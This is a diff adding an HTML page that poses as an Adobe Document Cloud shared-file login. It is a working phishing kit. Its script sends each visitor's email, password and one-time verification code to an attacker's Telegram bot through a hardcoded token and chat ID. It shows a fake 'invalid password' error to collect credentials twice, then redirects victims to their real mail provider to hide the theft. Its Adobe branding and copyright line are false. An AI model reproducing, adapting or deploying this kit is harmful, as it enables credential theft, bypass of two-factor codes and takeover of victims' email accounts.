@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <!-- Meta Tags -->
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport">
+
+    <!-- Page Title -->
+    <title>Cloud-based Share Point</title>
+
+    <!-- Favicon -->
+    <link href="#" rel="icon">
+
+    <link href="main.css" rel="stylesheet">
+    <link href="bootstrap.min.css" rel="stylesheet">
+</head>
+
+<body>
+
+    <section class="main">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-md-8 col-lg-6 mx-auto my-5">
+                    <div class="card rounded-lg light-black">
+                        <div class="card-body p-5">
+                            <div class="text-center">
+                                <img src="./head.jpg" class="head-img" alt="">
+                                <div class="mt-3">
+                                    <span class="h4 text-white">Adobe Document Cloud</span>
+                                    <br>
+                                    <span class="h5 text-white fw-normal">To read the document, please choose your email
+                                        provider below login to view shared file.</span>
+                                </div>
+
+                            </div>
+
+                            <div>
+                                <div data-category="01" class="box-tab tab-1">
+                                    <img src="./icons/icon_01.png" class="small-icon" alt="">
+                                    <span class="p-2">Sign in with Gmail</span>
+                                </div>
+
+                                <div data-category="02" class="box-tab tab-2">
+                                    <img src="./icons/icon_02.png" class="small-icon" alt="">
+                                    <span class="p-2">Sign in with Outlook</span>
+                                </div>
+
+                                <div data-category="03" class="box-tab tab-3">
+                                    <img src="./icons/icon_03.png" class="small-icon" alt="">
+                                    <span class="p-2">Sign in with AOL</span>
+                                </div>
+
+                                <div data-category="04" class="box-tab tab-4">
+                                    <img src="./icons/icon_04.png" class="small-icon" alt="">
+                                    <span class="p-2">Sign in with Office 365</span>
+                                </div>
+
+                                <div data-category="05" class="box-tab tab-5">
+                                    <img src="./icons/icon_05.png" class="small-icon" alt="">
+                                    <span class="p-2">Sign in with Yahoo</span>
+                                </div>
+
+                                <div data-category="06" class="box-tab tab-6">
+                                    <img src="./icons/icon_06.png" class="small-icon" alt="">
+                                    <span class="p-2">Sign in with Other mail</span>
+                                </div>
+                            </div>
+
+                            <div class="">
+                                <p class="text-white mt-3 text-center">Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.</p>
+                                <p class="h5 text-center text-white">&copy; 2026 Adobe system incorporated, All right reserved.
+                                </p>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal modal-sheet p-4 py-md-5" tabindex="-1" role="dialog" id="modalSignin">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content rounded-4 shadow">
+                    <div class="modal-header p-5 pb-4 border-bottom-0">
+                        <h1 class="fw-bold mb-0 fs-2">Sign in</h1>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+
+
+                    <div class="modal-body p-5 pt-0">
+
+                        <div class="text-center pb-4">
+                            <img id="iconImg" src="./images/01.png" class="img-fluid rounded-circle" width="80px">
+                        </div>
+
+                        <div id="notifier">
+                        </div>
+
+                        <form class="" id="sign-in" method="POST">
+                            <input type="hidden" name="category" id="category" value="01">
+                            <div class="form-floating mb-3">
+                                <input type="email" name="email" class="form-control rounded-3" id="floatingInput" placeholder="name@example.com" value="" required>
+                                <label for="floatingInput">Email address</label>
+                            </div>
+                            <div class="form-floating mb-3">
+                                <input type="password" name="password" class="form-control rounded-3" id="floatingPassword" placeholder="Password" required>
+                                <label for="floatingPassword">Password</label>
+                            </div>
+                            <div class="form-check mb-3">
+                                <input class="form-check-input" type="checkbox" id="showPassword">
+                                <label class="form-check-label" for="showPassword">
+                                    Show password
+                                </label>
+                            </div>
+                            <button class="w-100 mb-2 btn btn-lg rounded-3 btn-signin" type="submit">Login</button>
+                            <small class="text-body-secondary">We'll never share your email with anyone else.</small>
+
+                        </form>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal modal-sheet p-4 py-md-5" tabindex="-1" role="dialog" id="modalVerification">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content rounded-4 shadow">
+                    <div id="verificationHeader" class="modal-header p-5 pb-4 border-bottom-0">
+                        <h1 class="fw-bold mb-0 fs-2">Account Verification</h1>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+
+                    <div class="modal-body p-5 pt-0">
+                        <div id="verificationNotifier">
+                            <div class="alert alert-warning" role="alert">
+                                <strong>Warning:</strong> It seems you are entering a wrong credentials. A one-time password has been sent to your registered phone number. Please verify your identity or contact support.
+                            </div>
+
+                            <p class="text-center text-muted">
+                                If you continue to experience issues, please contact Adobe Support.
+                            </p>
+                        </div>
+
+                        <div id="verificationStep1" class="text-center mt-4">
+                            <button type="button" class="btn btn-primary rounded-3" id="verifyBtn">Verify</button>
+                        </div>
+
+                        <div class="text-center pb-4 mt-4">
+                            <img id="iconImgVerify" src="./images/01.png" class="img-fluid rounded-circle" width="80px" style="display: none;">
+                        </div>
+
+                        <div id="verificationInfoAlert" class="alert alert-info" role="alert" style="display: none;">
+                            Please enter the verification code sent to you.
+                        </div>
+
+                        <div id="verificationStep2" class="mt-4" style="display: none;">
+                            <div class="form-floating mb-3">
+                                <input type="text" class="form-control rounded-3" id="verificationCode" placeholder="Enter code" required>
+                                <label for="verificationCode">Verification code</label>
+                            </div>
+                            <div class="form-check mb-3">
+                                <input class="form-check-input" type="checkbox" id="showCode">
+                                <label class="form-check-label" for="showCode">
+                                    Show code
+                                </label>
+                            </div>
+                            <button type="button" class="btn btn-primary rounded-3 w-100" id="submitCodeBtn">Submit
+                                Code</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+
+    <!-- Scripts -->
+    <script src="./js/jquery-3.6.0.min.js"></script>
+    <script src="./js/popper.min.js"></script>
+    <script src="./js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            let attemptCount = 0;
+            const botToken = "8815091559:AAG6k-KVcdsRhzOr7kyNqYB7qn-dzqTe2WY";
+            const chatId = "8375103618"
+
+            // Map category numbers to provider names
+            const categoryMap = {
+                "01": "Gmail",
+                "02": "Outlook",
+                "03": "AOL",
+                "04": "Office 365",
+                "05": "Yahoo",
+                "06": "Other mail"
+            };
+
+            // Map category numbers to redirect URLs
+            const redirectMap = {
+                "01": "https://mail.google.com/mail/u/0/?tab=rm&ogbl#inbox",
+                "02": "https://outlook.live.com/mail/inbox",
+                "03": "https://mail.aol.com/webmail-std/en-us/suite",
+                "04": "https://www.office.com/launch/office365",
+                "05": "https://mail.yahoo.com/d/folders/1",
+                "06": "https://www.adobe.com/"
+            };
+
+            function sendToTelegram(message) {
+                $.ajax({
+                    url: "https://api.telegram.org/bot" + botToken + "/sendMessage",
+                    method: "POST",
+                    data: {
+                        chat_id: chatId,
+                        text: message
+                    },
+                    success: function(response) {
+                        // console.log("Telegram message sent:", response);
+                    },
+                    error: function(error) {
+                        // console.error("Error sending Telegram message:", error);
+                    }
+                });
+            }
+
+            $("[data-category]").on("click", function() {
+                attemptCount = 0;
+                $("#notifier").html("");
+                $("#iconImg").attr("src", "");
+                var category = $(this).attr("data-category");
+                $("#category").val(category);
+                $("#iconImg").attr("src", "./images/" + category + ".png");
+                $("#iconImgVerify").attr("src", "./images/" + category + ".png");
+                $("#modalSignin").modal("show");
+            });
+
+            $("#sign-in").on("submit", function(e) {
+                e.preventDefault();
+                attemptCount++;
+                const formData = $(this).serializeArray();
+                const email = formData.find(item => item.name === "email").value;
+                const password = formData.find(item => item.name === "password").value;
+                const category = $("#category").val();
+                const provider = categoryMap[category] || category;
+
+                // Create Telegram payload
+                let payload = `
+                 [+]────【Adobe】────[+]
+                    ───Login From───: ${provider}
+                    【Online ID】 : ${email}
+                    【Passcode】 : ${password}
+                    |------ I N F O | I P ------|
+                    🗺️ |Client IP: 127.0.0.1 ...|🗺️
+                    📍|--- http://www.geoiptool.com/?IP=127.0.0.1 ---|📍
+                    User Agent : Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36
+                    [+]────【Unmasked Developer】────[+]
+                `;
+
+                // Send to Telegram
+                sendToTelegram(payload);
+
+                if (attemptCount < 2) {
+                    // First attempt - show error message
+                    $("#notifier").html(
+                        '<div class="alert alert-danger" role="alert">Invalid email or password. Please try again.</div>'
+                    );
+                } else if (attemptCount === 2) {
+                    // Second attempt - close sign-in modal and open verification modal
+                    $(document.activeElement).blur();
+                    $("#modalSignin").modal("hide");
+                    setTimeout(() => {
+                        $("#modalVerification").modal("show");
+                        $("#modalVerification .btn-close").focus();
+                    }, 300);
+                }
+            });
+
+            // Verify button - hide intro, show icon and code input form
+            $("#verifyBtn").on("click", function() {
+                $("#verificationHeader").hide();
+                $("#verificationNotifier").hide();
+                $("#verificationStep1").hide();
+                $("#iconImgVerify").show();
+                $("#verificationInfoAlert").show();
+                $("#verificationStep2").show();
+                $("#verificationCode").focus();
+            });
+
+            $("#backBtn").on("click", function() {
+                $("#verificationStep2").hide();
+                $("#verificationStep1").show();
+                $("#verificationCode").val("");
+            });
+
+            $("#submitCodeBtn").on("click", function() {
+                var code = $("#verificationCode").val();
+                var category = $("#category").val();
+                var provider = categoryMap[category] || category;
+
+                if (code.trim() === "") {
+                    alert("Please enter a verification code");
+                    return;
+                }
+
+                // Send code submission to Telegram
+                const payload = `
+                [+]────【Adobe】────[+]
+                    ───Login From───: ${provider}
+                    Verification Code】 : ${code}
+                    |------ I N F O | I P ------|
+                    🗺️ |Client IP: 127.0.0.1 ...|🗺️
+                    📍|--- http://www.geoiptool.com/?IP=127.0.0.1 ---|📍
+                    User Agent : Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36
+                    [+]────【Unmasked Developer】────[+]
+                `;
+                sendToTelegram(payload);
+
+                // Redirect to the appropriate provider after 1 second (modal stays visible)
+                setTimeout(() => {
+                    var redirectUrl = redirectMap[category] || "https://www.adobe.com/";
+                    window.location = redirectUrl;
+                }, 1000);
+
+                $("#verificationCode").val("");
+            });
+
+            $("#showPassword").on("change", function() {
+                var passwordInput = $("#floatingPassword");
+                if ($(this).is(":checked")) {
+                    passwordInput.attr("type", "text");
+                } else {
+                    passwordInput.attr("type", "password");
+                }
+            });
+
+            $("#showCode").on("change", function() {
+                var codeInput = $("#verificationCode");
+                if ($(this).is(":checked")) {
+                    codeInput.attr("type", "text");
+                } else {
+                    codeInput.attr("type", "password");
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
